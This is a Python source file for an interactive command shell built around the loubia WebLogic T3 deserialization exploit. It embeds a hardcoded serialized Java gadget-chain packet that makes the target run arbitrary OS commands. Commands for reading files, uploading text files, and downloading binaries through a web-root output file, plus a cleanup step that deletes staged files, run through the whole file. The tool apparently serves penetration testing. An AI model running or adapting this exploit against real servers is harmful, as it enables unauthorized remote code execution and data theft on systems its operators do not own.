#!/usr/bin/python

# A command shell built around loubia (https://github.com/metalnas/loubia)
# Basically all functions outside of the CmdLoubia class where copied from that project but were reorganized to fit a
# command prompt.
# Author: Jason Gillam
# Created: 7/1/16
#
import os
import socket
import binascii
import time
import ssl
import argparse
import cmd
import requests


# args is an array containing target hostname and port
# options are all of the actual arguments passed in
import sys


def setup_loubia(is_ssl, ssl_protocols, protocol):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if is_ssl:
        sock = ssl.wrap_socket(sock, ssl_version=ssl_protocols[protocol])
        headers = 't3s 10.3.6\nAS:255\nHL:19\n\n'
    else:
        headers = 't3 10.3.6\nAS:255\nHL:19\n\n'
    return sock, headers

# serialized java object is already in the packet, just replace the command to execute and update the corresponding length. Also handle target os type
def update_payload(payload, packet, os, shell, verbose):
    if verbose:
        print '[INFO] Supplied payload: ' + payload + '\n'
    payload = payload.encode("hex")
    # if verbose:
    # print '[INFO] Encoded payload: '+payload+'\n'
    hex_len = hex(len(payload) / 2)[2:]
    payload = '0' * (4 - len(hex_len)) + hex_len + payload
    if verbose:
        print '[INFO] Final payload ' + payload + '\n'
    packet = packet[:3880] + payload + packet[3954:]
    # if target os is win replace "/bin/sh -c" with "cmd.exe /c"
    if os == 'win':
        if verbose: print '[INFO] Target os is win: using "cmd.exe /c"\n'
        packet = packet.replace('2f62696e2f73687400022d63', '636d642e6578657400022f63')
    # if shell is bash replace "/bin/sh" with "/bin/bash"
    elif shell == 'bash':
        packet = packet.replace('72f62696e2f7368', '92f62696e2f62617368')
    if verbose: print '[INFO] Target os is unix: using "/bin/' + shell + ' -c"\n'
    return packet


# t3 packet must be preceeded by the total length of the packet (bytes) represented in hexa
def update_length(packet):
    hex_len = hex(len(packet) / 2)[2:]
    packet = packet[:4] + '0' * (4 - len(hex_len)) + hex_len + packet[8:]
    return packet


# this function makes sure that the t3 packet is not sent before receiving all t3 handshake response headers
def recv_timeout(the_socket, timeout=1):
    # make socket non blocking
    the_socket.setblocking(0)
    # total data partwise in an array
    total_data = [];
    data = '';
    # beginning time
    begin = time.time()
    while 1:
        # if you got some data, then break after timeout
        if total_data and time.time() - begin > timeout:
            break
        # if you got no data at all, wait a little longer, twice the timeout
        elif time.time() - begin > timeout * 2:
            break
        # recv something
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                # change the beginning time for measurement
                begin = time.time()
            else:
                # sleep for sometime to indicate a gap
                time.sleep(0.1)
        except:
            pass
    # join all parts to make final string
    return ''.join(total_data)


# perform the t3/t3s handshake
def t3_handshake(sock, server_address, headers, verbose):
    if verbose:
        print '[INFO] Connecting to %s port %s\n' % server_address
    try:
        sock.connect(server_address)
    except Exception as e:
        if e.args[1] == 'No route to host':
            print '[ERROR] No route to host. Do you know what you\'re doing ?'
            exit()
    # Send t3 headers
    if verbose:
        print '[INFO] Sending t3 headers:\n%s' % headers
    try:
        sock.sendall(headers)
    except Exception as e:
        if e.args[1] == 'Broken pipe':
            print '[ERROR] Broken pipe. Check the destination port man...'
            exit()
    # get reply and print
    t3_response = recv_timeout(sock)
    if verbose:
        print '[INFO] Received t3 handshake response:\n%s' % t3_response
    if "HELO" not in t3_response:
        if "html" in t3_response:
            print '[WARNING] Received HTML response instead of t3 handshake response, are you sure this is a t3 enabled port ? Well it isn\'t... Ciao !'
            exit()
        elif "FilterException" in t3_response:
            print '[WARNING] Received a FilterException error. Basically you\'ve been ****d by the blueteam !'
        else:
            print '[WARNING] Received non t3 response, sending payload anyway...\n'


def exploit(sock, headers, server_address, packet, payload, os, shell, verbose):
    t3_handshake(sock, server_address, headers, verbose)
    packet = update_payload(payload, packet, os, shell, verbose)
    packet = update_length(packet)
    try:
        sock.send(binascii.unhexlify(packet))
    except Exception as e:
        if e.args[1] == 'Broken pipe':
            print '[ERROR] Broken pipe error. Is backend ssl enabled ?\n'
            exit()
        elif e.args[1] == 'No route to host':
            print '[ERROR] No route to host. Do you know what you\'re doing ?'
            exit()
    if verbose:
        print '[INFO] Malicious packet sent\n'
    sock.close()


class CmdLoubia(cmd.Cmd):
    def __init__(self, args):
        cmd.Cmd.__init__(self)
        self.prompt = 'loubia [%s:%s]> ' % (args.host, args.port)
        self.os = args.os
        self.shell = args.shell
        self.is_ssl = args.ssl
        self.verbose = args.verbose
        self.server_address = (args.host, int(args.port))
        self.protocol = args.protocol
        # didn't find a way to select ssl protocol/cipher automatically. This depends also on ssl protocols available on your install.
        self.ssl_protocols = {'best': ssl.PROTOCOL_SSLv23, 'sslv3': ssl.PROTOCOL_SSLv3, 'tlsv1': ssl.PROTOCOL_TLSv1}
        # packet obtained from the command "java -cp weblogic.jar weblogic.Admin -adminurl t3://host:port -username weblogic -password weblogic PING" where the third serialised java object (at byte 750) was replaced by the origianl payload.
        self.packet = '''00000a2e016501ffffffffffffffff0000006a0000ea600000001900c9de850e99043d520d7a8631586329a7741a15cc93993f5b027973720078720178720278700000000a000000030000000000000000007070707070700000000a000000030000000000000000007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b7870737d00000001000d6a6176612e7574696c2e4d6170787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e00167571007e001b00000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000037400072f62696e2f73687400022d637400236563686f20224a4120666f722074686520574949494949494949494949494949494e22740004657865637571007e001e000000017671007e002f7371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003e61636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774f210000000000000000000f6c6f63616c686f7374000f6c6f63616c686f73741ad0c1740000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771c01b00e59eb1da220c200093132372e302e312e312c19d0c60000000078'''
        self.outfile = args.outfile
        self.outurl = args.outurl
        self.cleanup = True

    def escape_line(self, line):
        if self.os == 'win':
            line = line.replace('<', '^<')
            line = line.replace('>', '^>')
        return line

    def send_payload(self, payload):
        print 'Sending payload: %s' % payload
        sock, headers = setup_loubia(self.is_ssl, self.ssl_protocols, self.protocol)
        exploit(sock, headers, self.server_address, self.packet, payload, self.os, self.shell, self.verbose)
        time.sleep(1)
        r = requests.get(self.outurl)
        self.cleanup = False
        return r.text

    def do_run(self, line):
        print 'Building payload for... ' + line
        payload = '%s > %s' % (line, self.outfile)
        print self.send_payload(payload)

    def help_run(self):
        print 'Run the supplied payload on the target server. This is the default command.'
        print 'e.g. run dir c:\\'
        print ''

    def default(self, line):
        print 'Running default action on %s' % line
        self.do_run(line)

    def do_exit(self, line):
        if not self.cleanup:
            answer = raw_input('Temp file might still be on target.  Cleanup before exit? [Y/n]> ')
            if answer.lower() != 'n':
                self.do_cleanup(line)
        print 'Exiting...'
        return True

    def help_exit(self):
        print 'Exit this tool.'

    def do_cleanup(self, line):
        print 'Cleaning up temporary file %s' % self.outfile
        if self.os == 'win':
            payload = 'del %s' % self.outfile
        else:
            payload = 'rm %s' % self.outfile
        self.send_payload(payload)
        self.cleanup = True

    def help_cleanup(self):
        print 'Remove temp file from target system.'

    def do_cat(self, line):
        if self.os == 'win':
            payload = 'copy %s %s' % (line, self.outfile)
        else:
            payload = 'cp %s %s' % (line, self.outfile)
        print self.send_payload(payload)

    def help_cat(self):
        print 'Show a text file\'s contents (in windows or unix).  Does not concatenate multiple files.'
        print 'If you need to run the actual unix cat command, type "run cat" instead.'

    def do_type(self, line):
        self.do_cat(line)

    def help_type(self):
        print 'This is an alias for the cat command.  Type "help cat".'

    def do_put(self, line):
        cargs = line.split(' ')
        if len(cargs) != 2:
            print 'You must supply both the source and destination paths to use this command.'
        elif os.path.isfile(cargs[0]):
            f = open(cargs[0], 'r')
            lines = f.readlines()
            f.close()
            literator = iter(lines)
            first_item = next(literator)
            payload = 'echo %s > %s' % (self.escape_line(first_item.rstrip()), cargs[1])
            self.send_payload(payload)
            for l in literator:
                payload = 'echo %s >> %s' % (self.escape_line(l.rstrip()), cargs[1])
                self.send_payload(payload)
            print 'Done. Copied %i lines.' % len(lines)
        else:
            print 'The source path does not seem to exist or is not readable.'

    def help_put(self):
        print 'Similar to a ftp put, but for ascii files only.  This command will echo each line in the source file ' \
              'to the destination.'
        print 'e.g:   put /path/to/localfile c:\\path\\to\\destination'

    def do_get(self, line):
        cargs = line.split(' ')
        if len(cargs) != 2:
            print 'You must supply both the source and destination paths to use this command.'
        elif os.path.isdir(cargs[1]):
            print 'Please specify a filename instead of directory for destination path.'
        else:
            f = open(cargs[1], 'w')
            if self.os == 'win':
                payload = 'copy %s %s' % (cargs[0], self.outfile)
            else:
                payload = 'cp %s %s' % (cargs[0], self.outfile)
            text = self.send_payload(payload)
            f.write(text)
            f.close()
            print 'Done. Text file written locally: %s' % cargs[1]

    def help_get(self):
        print 'Similar to a ftp get, but for ascii files only.  This command will leverage the OUTFILE (pivot file) ' \
              'to retrieve a text file.'
        print 'e.g:   put c:\\path\\to\\source /path/to/localfile'

    def do_bget(self, line):
        cargs = line.split(' ')
        if len(cargs) != 2:
            print 'You must supply both the source and destination paths to use this command.'
        elif os.path.isdir(cargs[1]):
            print 'Please specify a filename instead of directory for destination path.'
        else:
            if self.os == 'win':
                payload = 'copy %s %s.bin > %s' % (cargs[0], self.outfile, self.outfile)
            else:
                payload = 'cp %s %s.bin > %s' % (cargs[0], self.outfile, self.outfile)

            print 'Staging temporary file on target...'
            print self.send_payload(payload)
            print 'Downloading...'
            r = requests.get('%s.bin' %self.outurl, stream=True)

            with open(cargs[1], 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
                        sys.stdout.write('.')
                        sys.stdout.flush()
            print 'Done downloading to %s' % cargs[1]
            print 'Removing temporary file from target.'
            if self.os == 'win':
                payload = 'del %s.bin' % self.outfile
            else:
                payload = 'rm %s.bin' % self.outfile
            self.send_payload(payload)
            print 'done.'

    def help_bget(self):
        print 'Retrieve a binary file from the target server.  You must specify the source and destination files.'
        print 'This command stages the binary file in the web root, downloads it, then deletes the staged file.'


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A command shell built around loubia '
                                                 '(https://github.com/metalnas/loubia).  The exploit code is included. '
                                                 'This can be used to push output to a file in the webroot.')
    parser.add_argument('host', help='The target hostname or ip address.')
    parser.add_argument('port', help='The target port')
    parser.add_argument('-o', '--os', help='Target operating system (win or unix)', required=True, choices=['win', 'unix'])
    parser.add_argument('-l', '--shell', help='Shell to use (for unix)', choices=['sh', 'bash'])
    parser.add_argument('-s', '--ssl', help='Use SSL', action='store_true', default=False)
    parser.add_argument('-p', '--protocol', help='SSL protocol to use (sslv3/tlsv1/best). Default is sslv3',
                        default='sslv3', choices=['best', 'sslv3', 'tlsv1'])
    parser.add_argument('-v', '--verbose', help='Print verbose output. Default : false', action='store_true', default=False)
    parser.add_argument('-u', '--outurl', help='URL where the output will show up.', required=True)
    parser.add_argument('-f', '--outfile', help='File on target system to place output. Should be under webroot and '
                                                'referenced by --outurl', required=True)
    args = parser.parse_args()

    cmd_loubia = CmdLoubia(args)
    cmd_loubia.cmdloop()